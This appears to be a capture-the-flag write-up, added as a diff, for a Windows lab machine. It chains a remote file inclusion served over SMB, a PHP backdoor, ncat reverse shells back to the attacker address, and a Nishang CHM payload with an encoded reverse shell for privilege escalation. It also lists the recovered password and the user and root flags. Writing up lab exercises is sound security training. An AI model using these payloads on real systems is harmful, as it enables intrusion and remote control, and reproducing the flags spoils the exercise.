@@ -1,0 +1,35 @@
+First of all, we find that port 80 is open.
+From little enum, we find two endpoints, '/blog' & '/user'. 
+On the user part, we can create an account but we can't exploit a thing because this is not vulnerable to sql injection and also, it doesn't have that much info on it.
+On the other hand. in the /blog we find that if we change languages the files are included with everything on them. So we can exploit a Local/Remote file inclusion. 
+Trying with the first, the LFI we can't get anything. So it's a RFI. 
+We can't exploit the RFI using local server, so we should get use of the SMB client.
+Setup a samba server. 
+Upload a backdoor and than use the link `http://10.10.10.151/blog/?lang=\\10.10.14.47\zaBogdan\backdoor.php&cmd=`
+Upload the nc.php to upload netcat, than upload shell.php to get the shell.
+Than `type db.php` and get the creds for user.
+
+Now let's escalte
+First powershell.exe
+Than `$pass = cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force`
+Than `$cred = New-Object System.Management.Automation.PSCredential("Sniper\Chris",$pass)`
+And we are in `Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred`
+Get the shell as user `Invoke-Command -Computer Sniper -ScriptBlock { cmd /c C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 1234 -e cmd.exe } -Credential $cred
+And we got the user!
+
+Heading to root.
+We find an interesting extension, .chm and on the first google search we get that it is vulnerabel for privilege escalation. 
+Now let's craft a payload [ echo -n 'cmd /c "C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 1337 -e cmd.exe"' | iconv -t UTF-16LE | base64 -w 0  ] with which we create the ninshag Out-CHM command [ Out-CHM -Payload "powershell -enc YwBtAGQAIAAvAGMAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAXABkAHIAaQB2AGUAcgBzAFwAYwBvAGwAbwByAFwAbgBjAGEAdAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4ANAA3ACAAMQAzADMANwAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAIgA=" -HHCPath "C:\Program Files (x86)\HTML Help Workshop" ] 
+Now let's upload it to the box, with the root in C:\Docs, because of the hint `Drop it here when you're done with it` [ Invoke-WebRequest "http://10.10.14.47/doc.chm" -OutFile "C:\Docs\doc.chm" ]
+Rooted.
+
+Users:
+-> Chris:36mEAhz/B8xQ~2VM
+
+Flags:
+-> User: 21f4d0f29fc4dd867500c1ad716cf56e
+-> Root: 5624caf363e2750e994f6be0b7436c15
+
+Articles:
+-> http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
+-> https://github.com/samratashok/nishang
